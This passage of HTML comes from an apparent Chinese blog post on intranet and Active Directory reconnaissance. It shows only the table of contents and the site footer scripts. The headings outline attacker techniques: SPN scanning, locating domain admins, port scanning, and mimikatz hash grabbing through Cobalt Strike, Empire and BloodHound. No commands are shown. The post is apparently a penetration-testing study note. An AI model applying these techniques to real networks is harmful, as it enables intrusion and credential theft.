href="#3-8-%E5%AF%B9%E6%AF%94%E6%9F%A5%E7%9C%8B%E2%80%9D%E5%B7%A5%E4%BD%9C%E7%AB%99%E5%9F%9FDNS%E5%90%8D%E7%A7%B0-%E5%9F%9F%E5%90%8D-%E2%80%9D%E5%92%8C%E2%80%9D%E7%99%BB%E5%BD%95%E5%9F%9F-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-%E2%80%9D%E7%9A%84%E4%BF%A1%E6%81%AF%E6%98%AF%E5%90%A6%E7%9B%B8%E5%8C%B9%E9%85%8D"><span class="toc-number">3.8.</span> <span class="toc-text">3.8 对比查看”工作站域DNS名称(域名)”和”登录域(域控制器)”的信息是否相匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-9-%E6%9F%A5%E7%9C%8B%E6%97%B6%E9%97%B4%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">3.9.</span> <span class="toc-text">3.9 查看时间可以找到域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-10-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5"><span class="toc-number">3.10.</span> <span class="toc-text">3.10 查看域密码策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-11-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%99%BB%E5%BD%95%E5%9F%9F"><span class="toc-number">3.11.</span> <span class="toc-text">3.11 查看当前登录域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-12-%E7%99%BB%E5%BD%95%E6%9C%AC%E6%9C%BA%E7%9A%84%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">3.12.</span> <span class="toc-text">3.12 登录本机的域管理员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-13-%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7ip"><span class="toc-number">3.13.</span> <span class="toc-text">3.13 获取域控ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-14-%E6%9F%A5%E8%AF%A2%E5%9F%9F"><span class="toc-number">3.14.</span> <span class="toc-text">3.14 查询域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-15-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%86%85%E7%9A%84%E6%89%80%E6%9C%89%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">3.15.</span> <span class="toc-text">3.15 查询域内的所有计算机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-16-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%9A%84%E6%89%80%E6%9C%89%E7%BB%84%EF%BC%88enterprise-admins%E7%BB%84%E6%9D%83%E9%99%90%E6%9C%80%E5%A4%A7%EF%BC%89"><span class="toc-number">3.16.</span> <span class="toc-text">3.16 查询域的所有组（enterprise admins组权限最大）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-17-SPN%E6%89%AB%E6%8F%8F"><span class="toc-number">3.17.</span> <span class="toc-text">3.17 SPN扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-18-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">3.18.</span> <span class="toc-text">3.18 查看域管理员的用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-19-%E6%9F%A5%E8%AF%A2%E5%9F%9F%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">3.19.</span> <span class="toc-text">3.19 查询域系统管理员用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-20-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">3.20.</span> <span class="toc-text">3.20 查看域控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-21-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E7%9A%84%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="toc-number">3.21.</span> <span class="toc-text">3.21 查看域控制器的机器名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-22-%E6%9F%A5%E7%9C%8Bdns%E7%BC%93%E5%AD%98"><span class="toc-number">3.22.</span> <span class="toc-text">3.22 查看dns缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-23-%E5%88%97%E5%9F%9F%E6%8E%A7c%E7%9B%98%E6%96%87%E4%BB%B6-%E9%9C%80%E8%A6%81%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90"><span class="toc-number">3.23.</span> <span class="toc-text">3.23 列域控c盘文件(需要域管理员权限)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-24-%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E5%9F%9F%E6%88%90%E5%91%98%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%88%97%E8%A1%A8"><span class="toc-number">3.24.</span> <span class="toc-text">3.24 查询所有域成员计算机列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-25-%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%BF%A1%E6%81%AF"><span class="toc-number">3.25.</span> <span class="toc-text">3.25 获取域信任信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-26-%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF"><span class="toc-number">3.26.</span> <span class="toc-text">3.26 获取域内用户的详细信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-27-%E6%9F%A5%E7%9C%8B%E5%AD%98%E5%9C%A8%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">3.27.</span> <span class="toc-text">3.27 查看存在的用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-28-%E6%9F%A5%E8%AF%A2%E6%89%80%E6%9C%89%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%90%8D%E7%A7%B0"><span class="toc-number">3.28.</span> <span class="toc-text">3.28 查询所有计算机名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-29-%E6%94%BB%E5%87%BB%E4%B8%BB%E6%9C%BACMD%E6%89%AB%E6%8F%8F%E5%90%8C%E7%BD%91%E6%AE%B5%E5%AD%98%E6%B4%BBip"><span class="toc-number">3.29.</span> <span class="toc-text">3.29 攻击主机CMD扫描同网段存活ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-30-PowerView-ps%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.30.</span> <span class="toc-text">3.30 PowerView.ps域内信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-31-cs%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.31.</span> <span class="toc-text">3.31 cs信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#target%E7%BB%84%E4%BF%A1%E6%81%AF%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.31.1.</span> <span class="toc-text">target组信息的命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%9B%AE%E5%BD%95"><span class="toc-number">3.31.2.</span> <span class="toc-text">获取远程目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E9%80%9A%E8%BF%87powershell%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">3.31.3.</span> <span class="toc-text">cs通过powershell命令获取目录信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E9%80%9A%E8%BF%87mimikatz%E6%8A%93%E5%8F%96%E8%BF%9C%E7%A8%8B%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">3.31.4.</span> <span class="toc-text">cs通过mimikatz抓取远程哈希值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-32-%E9%98%B2%E7%81%AB%E5%A2%99%E7%9B%B8%E5%85%B3"><span class="toc-number">3.32.</span> <span class="toc-text">3.32 防火墙相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-33-%E6%9F%A5%E8%AF%A2%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE%E6%83%85%E5%86%B5"><span class="toc-number">3.33.</span> <span class="toc-text">3.33 查询代理配置情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-34-%E6%9F%A5%E8%AF%A2%E5%B9%B6%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.34.</span> <span class="toc-text">3.34 查询并开启远程连接服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-35-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.35.</span> <span class="toc-text">3.35 端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-telnet%E7%AB%AF%E5%8F%A3%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.35.1.</span> <span class="toc-text">1. telnet端口连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-PowerSploit-%E4%B8%AD%E7%9A%84Invoke-portscan-ps1%E8%84%9A%E6%9C%AC"><span class="toc-number">3.35.2.</span> <span class="toc-text">2. PowerSploit 中的Invoke-portscan.ps1脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Nishang%E4%B8%AD%E7%9A%84Invoke-portscan-ps1"><span class="toc-number">3.35.3.</span> <span class="toc-text">3. Nishang中的Invoke-portscan.ps1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">3.35.4.</span> <span class="toc-text">4. Nmap扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Metasploit-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">3.35.5.</span> <span class="toc-text">5. Metasploit 端口扫描模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85%E7%AB%AF%E5%8F%A3%E7%9A%84banner%E4%BF%A1%E6%81%AF"><span class="toc-number">3.35.6.</span> <span class="toc-text">6. 收集域内端口的banner信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Banner"><span class="toc-number">3.35.7.</span> <span class="toc-text">获取Banner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E4%BD%BF%E7%94%A8Nmap%E8%8E%B7%E5%8F%96banner"><span class="toc-number">3.35.8.</span> <span class="toc-text">7. 使用Nmap获取banner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%BD%BF%E7%94%A8nc%E8%8E%B7%E5%8F%96banner"><span class="toc-number">3.35.9.</span> <span class="toc-text">8. 使用nc获取banner</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-36-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F"><span class="toc-number">3.36.</span> <span class="toc-text">3.36 存活主机扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nbtscan"><span class="toc-number">3.36.1.</span> <span class="toc-text">nbtscan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ping"><span class="toc-number">3.36.2.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#arp-scan-exe"><span class="toc-number">3.36.3.</span> <span class="toc-text">arp-scan.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC"><span class="toc-number">3.36.4.</span> <span class="toc-text">批处理脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F"><span class="toc-number">3.36.5.</span> <span class="toc-text">msf主机存活扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-37-%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">3.37.</span> <span class="toc-text">3.37 定位域管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#psloggeddon-exe"><span class="toc-number">3.37.1.</span> <span class="toc-text">psloggeddon.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PVEFindADUser-exe"><span class="toc-number">3.37.2.</span> <span class="toc-text">PVEFindADUser.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powerview-ps1"><span class="toc-number">3.37.3.</span> <span class="toc-text">powerview.ps1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-38-Empire%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.38.</span> <span class="toc-text">3.38 Empire信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-39-powersploit-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.39.</span> <span class="toc-text">3.39 powersploit 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-40-%E7%BF%BB%E7%BF%BB%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.40.</span> <span class="toc-text">3.40 翻翻配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-41-BloodHound%E5%9F%9F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">3.41.</span> <span class="toc-text">3.41 BloodHound域分析工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-number">3.41.1.</span> <span class="toc-text">配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-42-%E4%BD%BF%E7%94%A8empire%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-number">3.42.</span> <span class="toc-text">3.42 使用empire收集信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">四、参考文章：</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>